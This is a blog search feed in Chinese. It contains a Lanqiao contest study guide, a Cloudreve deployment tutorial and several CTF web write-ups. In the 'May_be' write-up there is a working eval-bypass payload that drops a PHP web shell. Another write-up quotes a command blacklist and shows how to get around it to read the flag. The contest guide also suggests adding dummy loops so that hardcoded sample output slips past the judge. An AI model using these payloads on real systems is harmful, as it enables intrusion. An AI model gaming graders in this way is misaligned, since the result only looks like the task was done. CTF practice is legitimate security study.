<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>速成蓝桥省一</title>
    <link href="/2023/12/14/%E9%80%9F%E6%88%90%E8%93%9D%E6%A1%A5%E7%9C%81%E4%B8%80/"/>
    <url>/2023/12/14/%E9%80%9F%E6%88%90%E8%93%9D%E6%A1%A5%E7%9C%81%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="蓝桥速成攻略"><a href="#蓝桥速成攻略" class="headerlink" title="蓝桥速成攻略"></a>蓝桥速成攻略</h1><h2 id="语言篇"><a href="#语言篇" class="headerlink" title="语言篇"></a>语言篇</h2><ul><li>c：优势在于运行速度快，占用内存小，因为题目会对你的程序进行内存和运行时间的要求，就算你的题解正确，如果超时或者超过限制内存，一样判错，但只是个别用例。</li><li>python：上手快，一天掌握基础语法，第二天就可以开始刷题，缺点是运行时间和内存占用较大。</li></ul><p>​我的建议是选择python，编程语言一通百通，不管学哪一门都不会影响别的语言的学习，反而会促进加深理解，如果只是为了一个奖项，不打算深入acm，选择高效的方式是性价比最高的。</p><p>​回到超时问题，一般题目会给针对你的程序拿5-10个左右的测试用例去测试你的程序的返回值，如果逻辑正确，一般只有一到两个的较大输入值会让python产生超时的结果。只判错一到两个，只影响得不到全分，大分值还是可以拿到。</p><p>​其次是解题速度，python语法简洁，在编写时速度较快，且出现的语法问题要比c少。</p><h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><h3 id="打基础篇"><a href="#打基础篇" class="headerlink" title="打基础篇"></a>打基础篇</h3><p>​如果有编程基础，看文档，看书是学习python最快的，</p><p>推荐的学习网站有</p><ul><li><a href="https://www.runoob.com/python3/python3-tutorial.html%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B">https://www.runoob.com/python3/python3-tutorial.html菜鸟教程</a></li><li><a href="https://www.w3cschool.cn/python3/">https://www.w3cschool.cn/python3/</a>  w3cschool   </li><li><a href="https://docs.python.org/zh-cn/3/">https://docs.python.org/zh-cn/3/</a>   python官方文档</li></ul><p>​如果觉得编程基础薄弱，看视频会更好的理解，缺点是时间较慢。</p><p>推荐的视频系列有</p><ul><li>小甲鱼 <a href="https://www.bilibili.com/video/BV1c4411e77t/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1c4411e77t/?spm_id_from=333.337.search-card.all.click</a></li><li>黑马 <a href="https://www.bilibili.com/video/BV1qW4y1a7fU/?spm_id_from=333.337.search-card.all.click&vd_source=8b3e9745e345ed6a03f449b9c133fee4">https://www.bilibili.com/video/BV1qW4y1a7fU/?spm_id_from=333.337.search-card.all.click&amp;vd_source=8b3e9745e345ed6a03f449b9c133fee4</a></li></ul><p>​视频和电子书的内容，不需要全部看完理解，只需要掌握基础的内容解题就够用了。需要掌握的基础内容如下，我给几个问题自检一下</p><ul><li>熟悉所有数据类型的相关操作<ul><li>字符串（拼接，拆分）</li><li>整数，浮点数的各种运算符</li><li>数组，列表，字典，集合（查找，排序，增删改查）</li></ul></li><li>熟悉所有控制语句</li><li>熟悉定义和调用函数</li><li>能够进行简单的文件操作</li><li>处理用户的长输入，多处输入，重复输入</li></ul><p>以上内容，一天就可以掌握，第二天开始刷题。</p><h3 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h3><p>推荐的刷题平台有：</p><ul><li>PTA ：<a href="https://pintia.cn/problem-sets/dashboard">https://pintia.cn/problem-sets/dashboard</a></li><li>力扣：<a href="https://leetcode.cn/">https://leetcode.cn/</a></li><li>洛谷 ：<a href="https://www.luogu.com.cn/problem/list">https://www.luogu.com.cn/problem/list</a></li><li>牛客：<a href="https://www.nowcoder.com/exam/company">https://www.nowcoder.com/exam/company</a></li></ul><p>​其中主要推荐力扣和PTA，力扣可以看到别人的解法，如果做不出来，就不要浪费时间，直接去看别人怎么做的，有看不懂的函数就先拿去菜鸟教程搜这个函数的用法，还是看不懂，就把代码复制下来发给gpt让它给你解释。</p><p>​PTA的题目全，由易到难都有。而且题目在CSDN基本都能找到答案。缺点是看不到测试用例。</p><h3 id="算法学习"><a href="#算法学习" class="headerlink" title="算法学习"></a>算法学习</h3><p>​其实这一块我都没啥发言权，虽然拿了个蓝桥国奖，但我其实没系统学过算法。而且那点基本的东西其实数学思维好一点自己也能想得出来。</p><p>​算法就相当于给你套公式，这里的话，中等难度题目里面会遇到的比较多的就是这几类</p><ul><li>简单递归</li><li>深度优先搜索</li><li>广度优先搜索</li><li>最短路径算法</li><li>动态规划</li></ul><p>​这些东西在我给你的那本PDF里面都有，那本书是最近新出的，写的很详细，面向算法零基础。有案例代码有图解。</p><p>如果看书看不懂的话，可以去B站单独搜索相应例子。</p><h3 id="进程安排"><a href="#进程安排" class="headerlink" title="进程安排"></a>进程安排</h3><p>​蓝桥是四月比赛，时间其实还非常充足，寒假一个月的时间足够学习上面的东西。</p><p>​python语法的概念只需要花一两天时间看就行了，然后就开始刷题，忘了语法或者函数用法就回头去看去查，编程只有用熟悉的，没有看熟悉的。最早就是在刷题中熟悉python语法，所以对题目做不做得出来不用有啥要求，每题都看答案也无所谓，看懂就行。</p><p>​在能够独立做一些基础题之后，比如什么水仙花数，斐波那契数列，求质因数，一个区间素数和，就可以开始啃一点算法了。有针对性的啃，理解完概念就单独照着那一种题型练，不要每一样看一点，每样看一点的结果就是都做不出来。</p><p>​蓝桥总共十道题，又是面向大学生的比赛，考的算法不会太难，上面说的那几样，十道里面总碰的上，再难的算法就不考大学生了。所以保证能拿的分拿到就行。</p><h2 id="应试技巧篇"><a href="#应试技巧篇" class="headerlink" title="应试技巧篇"></a>应试技巧篇</h2><p>​考试时长4小时，十道题，两道填空，八道编程</p><p>​需要注意的是，蓝桥在比赛的时候，只让你提交代码，你自己做的对不对，自己是不清楚的。所以，一定一定要考虑边界条件！</p><p>​比如让你算二十一世纪有多少个闰年，结果没算上2100年。因为填空题的答案只有一个，错了就一分没有。而且我们是短时间练出来，后面的大分值我们也拿不到，所以两道填空题是最基本的下限，是绝对不能丢的分。考虑所有的边界条件。</p><p>​同理，因为看不到他的测试用例，在能做出来的编程题里，我们也先在本地多测试。大数字，负数，根据题目的要求输入。把能想到的特殊情况都测试一遍。比赛会发草稿纸，必要时候手算检验一遍，一般情况我们时间都是非常充足的，因为后面的题目咱不会，所以把能拿的分拿到就好。</p><p>​当然，后面的题我们不会，也不代表我们要交白卷，蓝桥的测试是程序检测，程序进行输入，只要答案对一个就有一个的分。在每道题的题干里，通常会给一个例子。我们做不出来题目，就把这个例子照样子输出出来，在部分题目中，例子也会作为测试用例出现，所以能蹭的分一定要蹭。</p><p>​这个蹭分有个小技巧，蓝桥官方是会想到有人这样蹭分的，所以他们有一套检验机制，就是如果你程序行数很少，运行时间和占用内存也非常小，是会被直接判无效程序的。比如你的程序只有一行print，占用就非常小。这个时候虽然你输出的是一个正确答案，但不会被算作有效程序。所以我们在输出例子中的内容蹭分的时候，先写几个没用的for循环，套两层for循环，一个循环一百次，占用一些内存和时间，然后再在最后输出内容。就可以蹭到分了。</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cloudreve部署</title>
    <link href="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/"/>
    <url>/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="Cloudreve部署"><a href="#Cloudreve部署" class="headerlink" title="Cloudreve部署"></a>Cloudreve部署</h1><p>​Linux专业课 期末大作业</p><p>​Cloudreve是一个由Go语言开发的网盘系统，可以快速部署在服务器上，支持不同的云存储平台。本次作业我们小组将基于Centos7使用Cloudreve搭建一个以ECS云盘为存储平台的小团体的网盘系统。</p><h2 id="1-1-环境准备"><a href="#1-1-环境准备" class="headerlink" title="1.1 环境准备"></a>1.1 环境准备</h2><p>​需要准备的内容有：</p><ul><li>Go语言开发环境</li><li>安装Node.js</li><li>安装Yarn</li><li>安装git</li></ul><p>​Cloudreve程序中内置了一个Web服务器，构建完毕运行之后会在5212端口创建一个服务，所以我们不需要额外安装Apache或者Nginx</p><h3 id="安装Go语言开发环境"><a href="#安装Go语言开发环境" class="headerlink" title="安装Go语言开发环境"></a>安装Go语言开发环境</h3><p>1.在Go官网下载Linux开发工具包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208165511910-1702048792490-20.png" alt="image-20231208165511910"></p><p>2.解压安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo tar -C /usr/local -xzf go1.16.7.linux-amd64.tar.gz<br></code></pre></td></tr></table></figure><p>3.设置环境变量</p><p>编辑文件<code>/etc/profile</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/profile<br></code></pre></td></tr></table></figure><p>在其底部添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export PATH=$PATH:/usr/local/go/bin<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208165958797-1702048792490-21.png" alt="image-20231208165958797"></p><p>4.查看go版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go version<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208170852664-1702048792490-22.png" alt="image-20231208170852664"></p><p>确保已经正确安装go环境。</p><h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><p>​Node.js是JavaScript的一个免费开源跨平台的一个运行环境，因为Cloudreve需要Node.js的支持，所以我们需要在centos7中安装Node.js。</p><p>1.在官网找到软件包</p><p>​<img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208172633648.png" alt="image-20231208172633648"></p><p>使用wget下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://nodejs.org/download/release/latest-v16.x/node-v16.20.2-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p>2.解压软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xvf node-v16.20.2-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208172754511-1702048792490-23.png" alt="image-20231208172754511"></p><p>3.移动目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv node-v16.20.2-linux-x64/ /usr/local/<br></code></pre></td></tr></table></figure><p>4.配置环境变量&amp;刷新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /etc/profile<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">export NODEJS=/usr/local/node-v16.20.2-linux-x64<br>export PATH=$PATH:$NODEJS/bin<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208173053180.png" alt="image-20231208173053180"></p><p>安装成功</p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208173233575.png" alt="image-20231208173233575"></p><h3 id="安装Yarn"><a href="#安装Yarn" class="headerlink" title="安装Yarn"></a>安装Yarn</h3><p>1.添加Yarn仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --silent --location https://dl.yarnpkg.com/rpm/yarn.repo | sudo tee /etc/yum.repos.d/yarn.repo<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208173432216.png" alt="image-20231208173432216"></p><p>2.安装Yarn</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum install -y yarn<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208173516937.png" alt="image-20231208173516937"></p><p>3.安装完成检查版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yarn --version<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208173541256-1702048792490-24.png" alt="image-20231208173541256"></p><h3 id="安装git工具"><a href="#安装git工具" class="headerlink" title="安装git工具"></a>安装git工具</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum install -y git<br></code></pre></td></tr></table></figure><h2 id="1-2-开始构建"><a href="#1-2-开始构建" class="headerlink" title="1.2 开始构建"></a>1.2 开始构建</h2><h3 id="克隆代码"><a href="#克隆代码" class="headerlink" title="克隆代码"></a>克隆代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone --recurse-submodules https://github.com/cloudreve/Cloudreve.git<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208173818483.png" alt="image-20231208173818483"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">签出要编译的版本</span><br>git checkout 3.x.x<br></code></pre></td></tr></table></figure><h3 id="构建静态资源"><a href="#构建静态资源" class="headerlink" title="构建静态资源"></a>构建静态资源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">进入前端子模块</span><br>cd assets<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装依赖</span><br>yarn install<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开始构建</span><br>yarn run build<br><span class="hljs-meta prompt_"># </span><span class="language-bash">构建完成后删除映射文件</span><br>cd build<br>find . -name &quot;*.map&quot; -type f -delete<br><span class="hljs-meta prompt_"># </span><span class="language-bash">返回项目主目录打包静态资源</span><br>cd ../../<br>zip -r - assets/build &gt;assets.zip<br></code></pre></td></tr></table></figure><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208180753853.png" alt="image-20231208180753853"></p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208180733294.png" alt="image-20231208180733294"></p><h3 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h3><p>获得当前版本号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">export COMMIT_SHA=$(git rev-parse --short HEAD)<br>export VERSION=$(git describe --tags)<br></code></pre></td></tr></table></figure><p>开始编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go build -a -o cloudreve -ldflags &quot; -X &#x27;github.com/cloudreve/Cloudreve/v3/pkg/conf.BackendVersion=$VERSION&#x27; -X &#x27;github.com/cloudreve/Cloudreve/v3/pkg/conf.LastCommit=$COMMIT_SHA&#x27;<br></code></pre></td></tr></table></figure><p>首次编译时，Go 会下载相关依赖库<img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208181120297.png" alt="image-20231208181120297"></p><p>编译完成之后，在项目根目录生成最终的可执行文件<code>cloudreve</code></p><h2 id="1-3-启动-Cloudreve"><a href="#1-3-启动-Cloudreve" class="headerlink" title="1.3 启动 Cloudreve"></a>1.3 启动 Cloudreve</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">赋予执行权限</span><br>chmod +x ./cloudreve<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动 Cloudreve</span><br>./cloudreve<br></code></pre></td></tr></table></figure><p>​Cloudreve 默认会监听<code>5212</code>端口。在浏览器中访问<code>http://服务器IP:5212</code>进入 Cloudreve。</p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208225643025-1702048792490-25.png" alt="image-20231208225643025"></p><h2 id="1-4-完成"><a href="#1-4-完成" class="headerlink" title="1.4 完成"></a>1.4 完成</h2><p>​访问IP:5212端口，保存初次启动Cloudreve的默认密码登录web端后台</p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208225711848.png" alt="image-20231208225711848"></p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208225802195.png" alt="image-20231208225802195"></p><p>​设置存储空间和用户组<img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208225806921.png" alt="image-20231208225806921"></p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208225835962.png" alt="image-20231208225835962"></p><p>​Cloudreve作为一个云盘系统，可以选择本机存储，从机存储，七牛云，或者阿里云OSS对象存储等多种存储方式</p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208230226316-1702048792490-26.png" alt="image-20231208230226316"></p><p>​并且还拥有创建分享链接的功能</p><p><img src="/2023/12/08/Cloudreve%E9%83%A8%E7%BD%B2/image-20231208230630730-1702048792490-27.png" alt="image-20231208230630730"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅刷一下</title>
    <link href="/2023/04/29/session%E5%8C%85%E5%90%AB/"/>
    <url>/2023/04/29/session%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h1><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/:/tmp/&#x27;</span>); <br><br><span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br><br>@<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$file</span>;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429214529086.png" alt="image-20230429214529086"></p><p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215002531.png" alt="image-20230429215002531"></p><p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215154334.png" alt="image-20230429215154334"></p><p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215201934.png" alt="image-20230429215201934"></p><p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215730026.png" alt="image-20230429215730026"></p><p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215750501.png" alt="image-20230429215750501"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>May_be一道代码执行绕过</title>
    <link href="/2023/04/29/maybe/"/>
    <url>/2023/04/29/maybe/</url>
    
    <content type="html"><![CDATA[<h2 id="题目：May-be"><a href="#题目：May-be" class="headerlink" title="题目：May_be"></a>题目：May_be</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$a</span>))  &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;May be you should bypass.&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个正则表达式匹配的是一个函数调用，其中：</p><ul><li><code>[^\W]+</code> 表示匹配一个或多个非特殊字符（即字母、数字和下划线）。</li><li><code>\(</code> 表示匹配一个左括号。</li><li><code>(?R)?</code> 表示匹配一个正则表达式自身（即递归地匹配整个表达式），可以有0个或1个，这个表达式实现了匹配嵌套函数的功能。</li><li><code>\)</code> 表示匹配一个右括号。</li></ul><p>因此，这个正则表达式可以匹配类似于 <code>function_name(arg1, arg2)</code> 这样的函数调用表达式，其中 <code>function_name</code> 是一个或多个非特殊字符组成的函数名，<code>arg1</code> 和 <code>arg2</code> 是传递给函数的参数。该正则表达式可以匹配包含嵌套函数调用的表达式，例如 <code>function1(function2(arg1), arg2)</code>。</p><p>意思就是只允许payload中出现字母，数字，下划线和<code>(``)</code></p><p>最早尝试a&#x3D;$_POST[]</p><p>但是想起来<code>$</code>也过滤，<code>[]</code>也过滤&#96;&#96;</p><p>最后的payload是</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">/?<span class="hljs-keyword">exp</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;echo &quot;&lt;?php\n @eval(\$_POST[&quot;cmd&quot;]);&quot; &gt; ma.php&#x27;</span>);&amp;a=<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">pos</span>(<span class="hljs-keyword">pos</span>(get_defined_vars())));<br></code></pre></td></tr></table></figure><p>将命令写在不被过滤的参数<code>exp</code>中，然后用<code>get_defined_vars()</code>获取已经定义的变量</p><p><img src="/2023/04/29/maybe/image-20230429001621633.png" alt="image-20230429001621633"></p><p>格式化一下大概是这样</p><p><img src="/2023/04/29/maybe/image-20230429002216880.png" alt="image-20230429002216880"></p><p>我们要取参数exp的值</p><p>先用<code>current</code>取到在数组当前值，也就是[_GET]的内容，也是一个数组</p><p><img src="/2023/04/29/maybe/image-20230429002506551.png" alt="image-20230429002506551"></p><p>然后要取这个数组里的第一个值用pos方法</p><p>如果参数写后面的就用end方法</p><p>比如这样</p><p><img src="/2023/04/29/maybe/image-20230429002721545.png" alt="image-20230429002721545"></p><p>现在可以执行任意命令了，</p><p>直接列出所有目录然后<code>CTRL+F</code>找flag</p><p><img src="/2023/04/29/maybe/image-20230429003221618.png" alt="image-20230429003221618"></p><p>直接cat 读不到文件，权限不够</p><p>flag文件属性0700</p><p>发现cp有su权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /.ffffffIIIIIII44444444444gggg /dev/stdout<br></code></pre></td></tr></table></figure><p>Get flag!</p><p>第二天起来发现环境开不了了，所以这部分没图😓</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>writeup1</title>
    <link href="/2023/04/28/writeup1/"/>
    <url>/2023/04/28/writeup1/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf第二天"><a href="#ctf第二天" class="headerlink" title="ctf第二天"></a>ctf第二天</h1><h2 id="notrce（无回显命令执行）"><a href="#notrce（无回显命令执行）" class="headerlink" title="notrce（无回显命令执行）"></a>notrce（无回显命令执行）</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|&gt;|&lt;|`|\*|\\$|\\\/i&quot;</span>,<span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤：</p><p><code>vi</code>, <code>less</code>, <code>tail</code>, <code>head</code>, <code>od</code>, <code>sh</code>, <code>echo</code>, <code>touch</code>, <code>re</code>, <code>mv</code>, <code>rm</code>, <code>cat</code>, <code>ls</code>, <code>tac</code>, <code>more</code>, <code>cut</code>, <code>curl</code>, <code>wget</code>, <code>base</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">&gt;</span><span class="hljs-punctuation">,</span> <span class="hljs-operator">&lt;</span><span class="hljs-punctuation">,</span> ```, *, \$, \\/<br></code></pre></td></tr></table></figure><p>exec执行无回显，</p><p>用tee命令把exec执行的结果输出到一个txt文本中</p><p><code>vidr|tee 1.txt</code></p><p><img src="/2023/04/28/writeup1/image-20230428125330260.png" alt="image-20230428125330260"></p><p>发现当前目录没有flag</p><p>用命令<code>du -ah /|tee 1.txt</code></p><p>从根目录开始列</p><p><code>ctrl+f</code>搜<code>flag</code></p><p><img src="/2023/04/28/writeup1/image-20230428130655604.png" alt="image-20230428130655604"></p><p>找到了，然后读取出来</p><p><code>nl /flag | tee 1.txt</code></p><p><img src="/2023/04/28/writeup1/image-20230428130752959.png" alt="image-20230428130752959"></p><h2 id="完美网站-条件竞争"><a href="#完美网站-条件竞争" class="headerlink" title="完美网站(条件竞争)"></a>完美网站(条件竞争)</h2><p>访问会一直重定向,直接访问网页，他会重定向到<code>xxxxxxxx/?img=dHVwaWFuLnBuZw==</code></p><p>参数img的值解出来是<code>tupian.png</code>,这里判断img传过去可能是一个读文件的方法。</p><p>直接访问会提示n没被定义</p><p><img src="/2023/04/28/writeup1/image-20230428142440565.png" alt="image-20230428142440565"></p><p>加上参数 n</p><p><code>GET /?img=dHVwaWFuLnBuZw==&amp;n=1</code></p><p><img src="/2023/04/28/writeup1/image-20230428142501955.png" alt="image-20230428142501955"></p><p>提示：</p><p><img src="/2023/04/28/writeup1/image-20230428142525171.png" 